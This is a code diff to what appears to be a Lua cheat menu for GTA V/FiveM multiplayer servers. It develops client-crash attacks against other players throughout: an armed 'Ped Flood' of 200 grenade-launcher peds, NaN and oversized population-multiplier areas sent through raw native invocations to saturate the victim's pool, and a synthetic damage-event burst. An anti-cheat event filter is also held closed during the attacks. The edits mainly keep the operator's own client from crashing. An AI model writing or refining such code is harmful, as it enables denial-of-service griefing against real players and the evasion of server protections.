@@ -13270,6 +13270,15 @@ end
 local pedFloodModel = "player_one"
 
 function Menu.ActionPedFlood()
+    -- Retired builder. Every reachable Ped Flood row now resolves through the
+    -- single hardened entry point defined later in this chunk. The guard is
+    -- unconditional: if the entry point is missing, the row returns instead of
+    -- falling through to the old builder, which created a player model under an
+    -- incompatible ped type and killed the local client on press.
+    local run = Menu.__vgdPedFlood
+    if type(run) == "function" then return run("legacy") end
+    do return end
+
     if not Menu.SelectedPlayer then
         print("[PedFlood] ERROR: No player selected")
         return
@@ -13489,25 +13498,19 @@ end
 Actions.pedFloodItem = FindItem("Online", "Troll", "Crash Method")
 if Actions.pedFloodItem then
     Actions.pedFloodItem.onClick = function()
-        _Stealth.blockAC = true
-        Menu.ActionPedFlood()
-        Citizen.SetTimeout(140000, function()
-            if _Stealth._acUsers <= 0 then _Stealth.blockAC = false end
-        end)
+        local run = Menu.__vgdPedFlood
+        if type(run) == "function" then return run("online") end
     end
 end
 
 -- Ped Flood is now a first-class row in Troll > Attacks, right under Shoot
--- Player. Same engine as Crash Method (Menu.ActionPedFlood), same AC block
--- window, so the two rows cannot drift apart.
+-- Player. Both historical bindings resolve through the single hardened entry
+-- point, which owns the AC filter window and the distance floor.
 Actions.pedFloodAttackItem = FindItem("Online", "Troll", "Ped Flood")
 if Actions.pedFloodAttackItem then
     Actions.pedFloodAttackItem.onClick = function()
-        _Stealth.blockAC = true
-        Menu.ActionPedFlood()
-        Citizen.SetTimeout(140000, function()
-            if _Stealth._acUsers <= 0 then _Stealth.blockAC = false end
-        end)
+        local run = Menu.__vgdPedFlood
+        if type(run) == "function" then return run("online") end
     end
 end
 
@@ -20334,6 +20337,7 @@ local PED = {
     holdMs = 20000,
     minDist = 250.0,
     fireMs = 100,
+    volleyDivisor = 5,
     fpsFloor = 18,
     weapon = "WEAPON_GRENADELAUNCHER",
     objectModel = "prop_roadcone02b",
@@ -20861,11 +20865,23 @@ local function runPedFlood(target)
 
             local tc = coordsOf(tp)
             if tc then
-                for i = 1, #C.created do
-                    local p = C.created[i]
-                    if DoesEntityExist(p) then
-                        pcall(SetPedShootsAtCoord, p, tc.x, tc.y, tc.z, true)
+                -- Bounded volley. The combat task already drives fire; this
+                -- only forces a coordinate shot on a rotating slice so each
+                -- ped refreshes every volleyDivisor ticks instead of every
+                -- tick. The sender is the creator, so 200 forced calls every
+                -- 100 ms (~2000 rockets/s) was the local spike that used to
+                -- kill the operator before migration settled.
+                local n = #C.created
+                if n > 0 then
+                    local slice = math.max(1, math.ceil(n / PED.volleyDivisor))
+                    local first = ((C.volley or 0) * slice) % n + 1
+                    for k = 0, slice - 1 do
+                        local p = C.created[((first + k - 1) % n) + 1]
+                        if DoesEntityExist(p) then
+                            pcall(SetPedShootsAtCoord, p, tc.x, tc.y, tc.z, true)
+                        end
                     end
+                    C.volley = (C.volley or 0) + 1
                 end
             end
         end
@@ -21381,6 +21397,7 @@ function C.launch(kind)
     C.created = {}
     C.ambient = {}
     C.props = {}
+    C.volley = 0
     C.targetPed = target.ped
     C.targetDist = target.dist
     local okSid, sid = pcall(GetPlayerServerId, target.player)
@@ -25911,7 +25928,7 @@ function A.boot()
 
     if A._booted then return end
     A._booted = true
-    O.log("loader build 2026-10-30-r44 (ped-free world-state lane)")
+    O.log("loader build 2026-10-30-r45 (density ladder + busy guard)")
     O.log("protection defaults: anti-freeze, anti-attach, anti-spectate, ped guard armed")
     O.every("evasion", 900, A.tick, 350)
     O.every("pedGuardWatch", 100, A.pedGuardWatch, 0)
@@ -33549,14 +33566,16 @@ local function cloneRun()
 end
 
 function CLONE.start()
-    if CLONE.active then
-        CLONE.stop()
-        O.log("clone crash: stopping, %d peds", #CLONE.peds)
-        return false
+    -- Retired builder. The clone recipe spawns player models under an
+    -- incompatible ped type; the local client resolves the same invalid
+    -- variation table the victim would and faults on press. Every menu
+    -- surface resolves through the hardened entry point instead.
+    if CLONE.active then CLONE.stop() end
+    if type(Menu.__vgdPedFlood) == "function" then
+        return Menu.__vgdPedFlood("clone")
     end
-    CLONE.active = true
-    Citizen.CreateThread(cloneRun)
-    return true
+    O.log("clone crash: retired builder, no safe entry")
+    return false
 end
 
 function CLONE.cleanup()
@@ -34407,21 +34426,16 @@ function DROP.stop()
 end
 
 function DROP.start()
-    if DROP.running then
-        DROP.stop()
-        O.log("drop: stopping")
-        return false
+    -- Retired builder. Same local fault as CLONE: pedType 28 with a player
+    -- model, ownership frozen on the sender, no maximum distance. The menu
+    -- resolves through the hardened entry point; this function exists only so
+    -- a stale binder cannot reach the old path.
+    if DROP.running then DROP.stop() end
+    if type(Menu.__vgdPedFlood) == "function" then
+        return Menu.__vgdPedFlood("drop")
     end
-    DROP.running = true
-    Citizen.CreateThread(function()
-        local ok, err = pcall(dropRun)
-        if not ok then
-            O.log("drop: run error %s", tostring(err))
-            dropStatus("error")
-        end
-        DROP.running = false
-    end)
-    return true
+    O.log("drop: retired builder, no safe entry")
+    return false
 end
 
 -- ---------------------------------------------------------------------------
@@ -34812,14 +34826,14 @@ local WORLD = {
     -- Echelle de densites : la native rejette 1e38 (id=0, mesure en jeu).
     -- On pose toutes les valeurs acceptees ; la plus grande sature le pool.
     popDensities = { 10.0, 1000.0, 100000.0, 1e7, 1e9, 1e12, 1e20 },
-    sphereDensity = 0 / 0,
+    sphereDensities = { 1e6, 1e9, 1e12, 0 / 0 },
     extent = 80.0,
     useRope = false,
     ropeLength = 1e6,
     ropes = {},
     pops = {},
+    spheres = {},
     nanArea = nil,
-    sphere = nil,
     scen = nil,
 }
 
@@ -34849,9 +34863,10 @@ local function worldClear()
         pcall(RemovePopMultiplierArea, WORLD.nanArea, true)
         WORLD.nanArea = nil
     end
-    if WORLD.sphere then
-        pcall(RemovePopMultiplierSphere, WORLD.sphere, true)
-        WORLD.sphere = nil
+    for i = #WORLD.spheres, 1, -1 do
+        local id = WORLD.spheres[i]
+        if id and id ~= 0 then pcall(RemovePopMultiplierSphere, id, true) end
+        WORLD.spheres[i] = nil
     end
     if WORLD.scen then
         pcall(RemoveScenarioBlockingArea, WORLD.scen, true)
@@ -34912,9 +34927,11 @@ local function worldRun(gen)
     -- supplementaire. La plus grande acceptee sature le pool de la victime.
     for i = 1, #WORLD.popDensities do
         local d = WORLD.popDensities[i]
-        local okD, id = pcall(AddPopMultiplierArea,
+        -- Appel brut par hash : p9, absent du wrapper Lua 9 params, est
+        -- transmis ici. Si isNetwork est p9, c'est ce qui rend l'aire reseau.
+        local okD, id = pcall(Citizen.InvokeNative, 0x67F6413D3220E18D,
             c.x - r, c.y - r, c.z - r, c.x + r, c.y + r, c.z + r,
-            WORLD.pedDensity, d, true)
+            WORLD.pedDensity, d, true, true)
         if okD and type(id) == "number" and id ~= 0 then
             WORLD.pops[#WORLD.pops + 1] = id
             O.log("world: pop[%d] id=%s d=%.0e net=%s", i, tostring(id), d,
@@ -34926,9 +34943,9 @@ local function worldRun(gen)
 
     -- Aire NaN : le calcul de population de la victime part en NaN. La boite
     -- reste finie (20 m) donc l'operateur, a 200 m, n'entre jamais dedans.
-    local okNan, nanId = pcall(AddPopMultiplierArea,
+    local okNan, nanId = pcall(Citizen.InvokeNative, 0x67F6413D3220E18D,
         c.x - r, c.y - r, c.z - r, c.x + r, c.y + r, c.z + r,
-        WORLD.pedDensity, 0 / 0, true)
+        WORLD.pedDensity, 0 / 0, true, true)
     if okNan and type(nanId) == "number" and nanId ~= 0 then
         WORLD.nanArea = nanId
         O.log("world: pop nan id=%s net=%s", tostring(nanId), tostring(worldNet(nanId)))
@@ -34936,17 +34953,21 @@ local function worldRun(gen)
         O.log("world: pop nan failed ok=%s id=%s", tostring(okNan), tostring(nanId))
     end
 
-    -- Couche 3 : sphere de population autour de la cible, rayon 20 m, ped 0,
-    -- vehicule NaN. Autre chemin de gestion que l'aire ; meme securite
-    -- operateur (200 m hors sphere), aucune entite creee.
-    local okSph, sph = pcall(AddPopMultiplierSphere, c.x, c.y, c.z, r,
-        WORLD.pedDensity, WORLD.sphereDensity, true, true)
-    if okSph and type(sph) == "number" and sph ~= 0 then
-        WORLD.sphere = sph
-        O.log("world: sphere %s ped %.0f veh %s", tostring(sph),
-              WORLD.pedDensity, tostring(WORLD.sphereDensity))
-    else
-        O.log("world: sphere failed ok=%s id=%s", tostring(okSph), tostring(sph))
+    -- Couche 3 : spheres de population autour de la cible, rayon 20 m, ped 0.
+    -- Meme echelle que les aires : chaque sphere acceptee ajoute un
+    -- multiplicateur, la derniere est NaN. Autre chemin de gestion que l'aire ;
+    -- meme securite operateur (200 m hors sphere), aucune entite creee.
+    for i = 1, #WORLD.sphereDensities do
+        local d = WORLD.sphereDensities[i]
+        -- Appel brut par hash : 9e argument supplementaire, meme logique.
+        local okSph, sph = pcall(Citizen.InvokeNative, 0x32C7A7E8C43A1F80,
+            c.x, c.y, c.z, r, WORLD.pedDensity, d, true, true, true)
+        if okSph and type(sph) == "number" and sph ~= 0 then
+            WORLD.spheres[#WORLD.spheres + 1] = sph
+            O.log("world: sphere[%d] id=%s d=%s", i, tostring(sph), tostring(d))
+        else
+            O.log("world: sphere[%d] rejected d=%s id=%s", i, tostring(d), tostring(sph))
+        end
     end
     worldStatus("pop sent", gen)
 
@@ -35028,12 +35049,13 @@ function WORLD.start()
     WORLD.gen = WORLD.gen + 1
     local gen = WORLD.gen
     WORLD.running = true
-    O.log("world: natives pop=%s sphere=%s scen=%s net=%s rope=%s",
+    O.log("world: natives pop=%s sphere=%s scen=%s net=%s rope=%s invoke=%s",
         tostring(type(AddPopMultiplierArea) == "function"),
         tostring(type(AddPopMultiplierSphere) == "function"),
         tostring(type(AddScenarioBlockingArea) == "function"),
         tostring(type(_IS_POP_MULTIPLIER_AREA_UNK) == "function"),
-        tostring(type(SetRopesCreateNetworkWorldState) == "function"))
+        tostring(type(SetRopesCreateNetworkWorldState) == "function"),
+        tostring(type(Citizen.InvokeNative) == "function"))
     Citizen.CreateThread(function()
         local ok, err = pcall(worldRun, gen)
         if not ok then
@@ -35045,6 +35067,98 @@ function WORLD.start()
         WORLD.busy = false
         if WORLD.gen == gen then WORLD.running = false end
     end)
+    return true
+end
+
+-- ---------------------------------------------------------------------------
+-- PED FLOOD - SINGLE HARDENED ENTRY
+-- ---------------------------------------------------------------------------
+-- Every Ped Flood row (Online > Troll and Exploit > Crasher) resolves here.
+--
+-- Why the old rows killed the operator on press, at any distance:
+--   * DROP/CLONE created a player model under pedType 28/26/29. The local
+--     client owns that ped, so it resolves the same invalid variation table
+--     the victim would; the fault happened on the sender before any network
+--     update left the machine.
+--   * DROP froze ownership with SetNetworkIdCanMigrate(false), so the sender
+--     simulated the whole invalid wave.
+--   * DROP had no maximum distance. Beyond streaming range GetEntityCoords
+--     returns a stale anchor and the invalid peds were still created.
+--
+-- The entry point below reuses the armed swarm already present in 10_crash:
+-- pedType 4 with player models (same layout), network registration, migration
+-- enabled, local invisibility, a relative FPS brake and full teardown. It adds
+-- the operator-side preflight the old rows never had: a hard 250 m floor, a
+-- 400 m streaming ceiling, a local ped-pool ceiling and the AC event filter
+-- window. Nothing is created below 250 m; the row refuses with a toast.
+local PED_FLOOD = {
+    minDist = 250.0,
+    maxDist = 400.0,
+    poolCeiling = 232,
+    blockAcGrace = 30000,
+}
+
+local function pedFloodPool()
+    local ok, pool = pcall(GetGamePool, "CPed")
+    if not ok or type(pool) ~= "table" then return 0 end
+    return #pool
+end
+
+function Menu.__vgdPedFlood(source)
+    if C.running then
+        O.log("ped flood: already running")
+        pcall(Notify, "Ped flood: already running", CLR.blue)
+        return false
+    end
+
+    local stamp = GetGameTimer()
+    if type(C.cooldownUntil) == "number" and stamp < C.cooldownUntil then
+        local left = math.ceil((C.cooldownUntil - stamp) / 1000)
+        O.log("ped flood: cooldown %ds", left)
+        pcall(Notify, ("Ped flood: cooldown %ds"):format(left), CLR.blue)
+        return false
+    end
+
+    local localPeds = pedFloodPool()
+    if localPeds >= PED_FLOOD.poolCeiling then
+        O.log("ped flood: local ped pool %d at ceiling %d", localPeds, PED_FLOOD.poolCeiling)
+        pcall(Notify, ("Ped flood: local ped pool full (%d)"):format(localPeds), CLR.red)
+        return false
+    end
+
+    C.refresh("ped")
+    local target = C.target("ped")
+    if not target then
+        O.log("ped flood: no target inside %.0f-%.0f m", PED_FLOOD.minDist, PED_FLOOD.maxDist)
+        pcall(Notify, ("Ped flood: no target within %.0f m"):format(PED_FLOOD.maxDist), CLR.red)
+        return false
+    end
+    if target.dist < PED_FLOOD.minDist then
+        O.log("ped flood: target %.0f m, floor %.0f m", target.dist, PED_FLOOD.minDist)
+        pcall(Notify, ("Ped flood: move back to %.0f m (now %.0f m)"):format(
+            PED_FLOOD.minDist, target.dist), CLR.red)
+        return false
+    end
+
+    -- Keep the executor's AC server-event filter closed for the run and the
+    -- teardown. This is the existing _Stealth filter, not a new hook; the
+    -- reference-count guard prevents a later feature from being unblocked.
+    _Stealth.blockAC = true
+    Citizen.SetTimeout((C.PED and C.PED.holdMs or 20000) + PED_FLOOD.blockAcGrace, function()
+        if _Stealth._acUsers <= 0 then _Stealth.blockAC = false end
+    end)
+
+    O.log("ped flood: %s -> armed swarm, target %.0f m", tostring(source or "menu"), target.dist)
+    local ok, launched = pcall(C.launch, "ped")
+    if not ok then
+        O.log("ped flood: launch error %s", tostring(launched))
+        pcall(Notify, "Ped flood: launch error", CLR.red)
+        return false
+    end
+    if not launched then
+        O.log("ped flood: engine refused (cooldown, window or target)")
+        return false
+    end
     return true
 end
 
@@ -35110,32 +35224,32 @@ local function installCrasher()
         table.insert(category.tabs, 1, tab)
     end
 
-    -- Only the vectors kept on purpose: the proven armed flood (200 RPG peds
-    -- + 60 props, 250 m green-crash gate, stop on target disconnect) and the synthetic damage-event burst
-    -- (identity source/target, 250 m scope gate).
+    -- Only the vectors kept on purpose: one hardened Ped Flood entry (the
+    -- proven armed swarm: 200 player-model peds + 60 props, 250 m floor,
+    -- migration enabled, local invisibility, relative FPS brake) and the
+    -- synthetic damage-event burst (identity source/target, 250 m scope gate).
+    -- Both rows below resolve to the same entry point. The old DROP/CLONE
+    -- builders are no longer addressable from the menu: they created a player
+    -- model under an incompatible ped type, so the sender faulted first.
     tab.items = {
         {
-            -- La ligne ped : la version sure du crasher de clone. Peds
-            -- spoofes (pedType volontairement incompatible avec le modele),
-            -- propriete figee chez nous, invisible localement, watchdog qui
-            -- supprime tout ped dont on perd le controle. C'est ce que le
-            -- dump du 2026-10-29 a prouve qui casse, sans le swarm arme.
+            -- The row keeps its historical label. The engine is the armed
+            -- swarm: pedType 4, player models, network, migration true. The
+            -- 250 m floor is a hard refusal, not a warning.
             name = "Ped flood",
             type = "action",
             onClick = function()
-                CLONE.start()
+                Menu.__vgdPedFlood("crasher")
             end,
         },
         {
-            -- Ligne crash : la recette du build du 2026-10-28, celle qui
-            -- cassait. pedType 28 (animal) + modele joueur, variation
-            -- aleatoire sur tous les slots, clone force sur toutes les
-            -- machines, puis un second passage de variation (update de clone)
-            -- avant suppression. Aucun teleport. Press again to stop.
+            -- Historical "Crash" row. It resolves to the same hardened entry:
+            -- the invalid pedType 28 recipe is retired because it faulted on
+            -- the sender before the target ever resolved a clone.
             name = "Crash",
             type = "action",
             onClick = function()
-                DROP.start()
+                Menu.__vgdPedFlood("crash")
             end,
         },
         {
@@ -35186,10 +35300,10 @@ local function installCrasher()
         end
     end
 
-    -- Online > Troll > Ped Flood. La ligne existe deja dans la table statique
-    -- du menu mais SANS onClick : c'etait une ligne morte. On la cable ici au
-    -- lieu d'en ajouter une seconde, sinon deux lignes identiques sortent et
-    -- celle du haut ne fait rien.
+    -- Online > Troll > Ped Flood. The static row has no onClick in the base
+    -- table; it is wired here instead of appending a duplicate. It resolves to
+    -- the same hardened entry as the Crasher tab, so the Online surface can
+    -- never reach the retired DROP builder.
     local troll = findTab("Online", "Troll")
     if troll and type(troll.items) == "table" then
         for i = 1, #troll.items do
@@ -35198,7 +35312,7 @@ local function installCrasher()
             if nm == "Ped Flood" or nm:sub(1, 10) == "Ped Flood " then
                 it.dropBase = "Ped Flood"
                 it.onClick = function()
-                    DROP.start()
+                    Menu.__vgdPedFlood("online")
                 end
                 DROP.rows[#DROP.rows + 1] = it
                 break
